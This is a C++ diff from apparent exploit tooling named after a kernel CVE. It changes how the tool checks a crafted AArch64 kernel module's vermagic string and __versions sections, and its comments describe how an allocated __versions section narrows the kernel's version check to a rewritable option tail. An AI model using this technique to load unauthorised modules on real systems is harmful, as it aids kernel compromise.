@@ -21,6 +21,7 @@ namespace ghostlock::backend::cve_2026_43284::lkm {
     namespace {
         constexpr std::size_t kElfHeaderBytes = 64U;
         constexpr std::size_t kElfSectionHeaderBytes = 64U;
+        constexpr std::uint64_t kElfShfAlloc = 0x2U;
         constexpr std::uint16_t kElfTypeRelocatable = 1U;
         constexpr std::uint16_t kElfMachineAarch64 = 0xB7U;
         constexpr std::string_view kModinfoSection = ".modinfo";
@@ -71,6 +72,7 @@ namespace ghostlock::backend::cve_2026_43284::lkm {
         struct SectionView final {
             std::uint64_t offset = 0U;
             std::uint64_t size = 0U;
+            std::uint64_t flags = 0U;
         };
 
         /* Bounded NUL-terminated view at data[begin..end). */
@@ -130,6 +132,7 @@ namespace ghostlock::backend::cve_2026_43284::lkm {
                 }
                 out.offset = sec_off;
                 out.size = sec_size;
+                out.flags = read_u64(sh + 0x08U);
                 return true;
             }
             return false;
@@ -199,21 +202,33 @@ namespace ghostlock::backend::cve_2026_43284::lkm {
             dst[n] = '\0';
         }
 
-        std::string_view first_token(std::string_view text) noexcept {
+        /* Everything after the first space; empty when there is no space. This
+         * is the suffix same_magic() advances to (strcspn) when has_crcs. */
+        std::string_view after_first_space(std::string_view text) noexcept {
             const std::size_t space = text.find(' ');
-            return space == std::string_view::npos ? text : text.substr(0U, space);
+            return space == std::string_view::npos ? std::string_view{}
+                                                   : text.substr(space + 1U);
         }
 
         /* The kernel compares the full string when the module has no CRCs, so
-         * the classification only has to make the failure readable. */
+         * the classification only has to make the failure readable. Options is
+         * reserved for a differing option tail (the decisive, rewritable part);
+         * Release is a release-token-only difference that the CRC path ignores. */
         VermagicDiffReason classify_vermagic_diff(std::string_view module,
-                                                  std::string_view required) noexcept {
+                                                  std::string_view required,
+                                                  bool has_crcs) noexcept {
             if (module.empty() || required.empty()) {
                 return VermagicDiffReason::Unparsable;
             }
-            return first_token(module) != first_token(required)
-                           ? VermagicDiffReason::Release
-                           : VermagicDiffReason::Options;
+            const std::string_view module_tail = after_first_space(module);
+            const std::string_view required_tail = after_first_space(required);
+            if (has_crcs) {
+                return (module_tail.empty() || required_tail.empty())
+                               ? VermagicDiffReason::Unparsable
+                               : VermagicDiffReason::Options;
+            }
+            return module_tail != required_tail ? VermagicDiffReason::Options
+                                                : VermagicDiffReason::Release;
         }
 
         bool append_vermagic_token(char *out, std::size_t capacity, std::size_t &pos,
@@ -495,22 +510,38 @@ namespace ghostlock::backend::cve_2026_43284::lkm {
         const std::string_view required_view(required_buf, required_len);
         copy_bounded(facts.module_vermagic, vermagic);
         copy_bounded(facts.required_vermagic, required_view);
-        /* Kernel 5.15 check_modinfo() -> same_magic(): a module with no CRCs is
-         * compared in full, so this is strcmp, not a release-prefix test. */
-        if (vermagic != required_view) {
-            facts.vermagic_diff = classify_vermagic_diff(vermagic, required_view);
+
+        /* Probe __versions/.versions before the vermagic comparison: kernel
+         * find_sec("__versions") returns the section index for any SHF_ALLOC
+         * section of that name, even a zero-length one, and that index is the
+         * has_crcs argument same_magic() turns into a tail-only comparison. */
+        SectionView versions{};
+        SectionView versions_alt{};
+        const bool has_versions =
+                find_section(data, size, kVersionsSection, versions) &&
+                (versions.flags & kElfShfAlloc) != 0U;
+        const bool has_versions_alt =
+                find_section(data, size, kVersionsAltSection, versions_alt) &&
+                (versions_alt.flags & kElfShfAlloc) != 0U;
+        facts.has_crcs = has_versions || has_versions_alt;
+        facts.versions_empty =
+                !((has_versions && versions.size != 0U) ||
+                  (has_versions_alt && versions_alt.size != 0U));
+
+        /* Kernel 5.15 check_modinfo() -> same_magic(): with CRCs only the
+         * pre-first-space tail must match; without them the whole string does. */
+        const bool vermagic_ok =
+                facts.has_crcs
+                        ? after_first_space(vermagic) == after_first_space(required_view)
+                        : vermagic == required_view;
+        if (!vermagic_ok) {
+            facts.vermagic_diff =
+                    classify_vermagic_diff(vermagic, required_view, facts.has_crcs);
             error = LkmImageError::VermagicMismatch;
             return false;
         }
         facts.vermagic_matches = true;
 
-        SectionView versions{};
-        if ((find_section(data, size, kVersionsSection, versions) && versions.size != 0U) ||
-            (find_section(data, size, kVersionsAltSection, versions) && versions.size != 0U)) {
-            error = LkmImageError::NonEmptyVersions;
-            return false;
-        }
-        facts.versions_empty = true;
         facts.kcfi_present = contains_bytes(data, size, kCfiMarker);
         if (contains_bytes(data, size, kSignatureMarker)) {
             facts.signed_module = true;
